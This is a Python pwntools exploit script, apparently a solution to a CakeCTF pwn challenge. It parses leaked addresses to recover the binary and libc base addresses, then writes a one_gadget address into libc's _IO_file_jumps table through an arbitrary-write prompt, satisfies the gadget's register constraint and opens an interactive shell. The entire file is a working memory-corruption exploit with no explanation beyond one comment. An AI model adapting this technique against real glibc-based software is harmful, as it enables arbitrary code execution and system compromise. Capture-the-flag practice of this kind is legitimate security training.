import pwn

pwn.context.binary = elf = pwn.ELF("./chall")
libc = pwn.ELF("./libc-2.31.so")

if pwn.args.REMOTE:
    io = pwn.remote("pwn.cakectf.com", 9003)
else:
    io = pwn.process("./chall")

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *main+312
continue
""",
    )

leak = int(io.recvlineS().strip().split(" = ")[-1], 16)
elf.address = leak - elf.symbols.main
leak = int(io.recvlineS().strip().split(" = ")[-1], 16)
libc.address = leak - libc.symbols.printf

pwn.log.info(f"elf.address = {hex(elf.address)}")
pwn.log.info(f"libc.address = {hex(libc.address)}")

addr = libc.symbols._IO_file_jumps + 56
value = libc.address + 0xE6C7E

io.sendlineafter("address: ", hex(addr))
io.sendlineafter("value: ", hex(value))

# Must be null to satisfy register for one_gadget
io.sendlineafter("data: ", b"\x00")

io.interactive()
